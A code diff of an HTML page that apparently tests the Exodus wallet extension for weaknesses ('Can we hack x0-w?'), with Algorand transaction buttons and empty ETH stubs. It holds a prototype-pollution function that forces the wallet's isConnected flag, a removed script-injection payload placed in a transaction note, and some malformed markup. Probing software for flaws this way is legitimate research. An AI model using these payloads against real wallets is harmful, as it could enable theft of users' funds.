@@ -35,6 +35,14 @@
                 myEventDispatcher.doSomething();
             }
 
+///////////////////////////////////////////////////////////////////////////////////
+/////////////////////// ALGO //////////////////////////////////////////////////////            
+///////////////////////////////////////////////////////////////////////////////////
+            function algo_connect() {
+                console.log("[*] CONNECT")
+                window.exodus.algorand.connect();
+            }
+
 
             // Sign transaction
             async function sign_transaction() {
@@ -94,8 +102,7 @@
                 let suggestedParams = await algodClient.getTransactionParams().do();
                 
                 const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
-                const enc = new TextEncoder();
-                const note = enc.encode('<script>alert(1)<\/script>');
+                
                 let amount = 1000000; // equals 1 ALGO
                 let sender = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
 
@@ -155,14 +162,33 @@
             }
 
 
+///////////////////////////////////////////////////////////////////////////////////
+/////////////////////// ETH ///////////////////////////////////////////////////////            
+///////////////////////////////////////////////////////////////////////////////////
+
+
+            // Sign transaction
+            async function eth_sign_transaction() {
+                
+            }
+
+
+            async function eth_transaction() {
+                
+            }
+
+
+            async function eth_asset_transaction() {
+                
+            }
+
+///////////////////////////////////////////////////////////////////////////////////
+/////////////////////// REST //////////////////////////////////////////////////////            
+///////////////////////////////////////////////////////////////////////////////////
+
             function prot_pollute() {
                 window.exodus.p = {}
                 window.exodus.p["__proto__"]["isConnected"] = true
-            }
-
-            function algo_connect() {
-                console.log("[*] CONNECT")
-                window.exodus.algorand.connect();
             }
 
             function hack() {
@@ -199,14 +225,34 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
         <h1 style="color:#E00;text-shadow: 2px 2px 4px #0f0;">
-        38
+        39
         </h1>
         <h2>Can we hack x0-w?</h2>
+        " />
+        <hr />
+        <h3>ALGO</h3>
+        <hr />
         <input type="button" value="algo_connect" onclick="algo_connect()" />
-        <input type="button" value="accept_connection" onclick="accept_connection()" />
+        <input type="button" value="accept_connection" onclick="accept_connection()
         <input type="button" value="sign_transaction" onclick="sign_transaction()" />
         <input type="button" value="transaction" onclick="transaction()" />
         <input type="button" value="asset_transaction" onclick="asset_transaction()" />
+        <hr />
+        <h3>ETH</h3>
+        <hr />
+        <script>
+            if (ethereum.isConnected()) {
+                document.write('span style="color:green">CONNECTED</span>');
+            } else {
+                document.write('<span style="color:red">DISCONNECTED</span>');
+            }
+        </script>
+        <input type="button" value="eth_sign_transaction" onclick="eth_sign_transaction()" />
+        <input type="button" value="eth_transaction" onclick="eth_transaction()" />
+        <input type="button" value="eth_asset_transaction" onclick="eth_asset_transaction()" />
+        <hr />
+        <h3>REST</h3>
+        <hr />
         <input type="button" value="prot_pollute" onclick="prot_pollute()" />
         <input type="button" value="hack" onclick="hack()" />
         <input type="button" value="hack2" onclick="hack2()" />
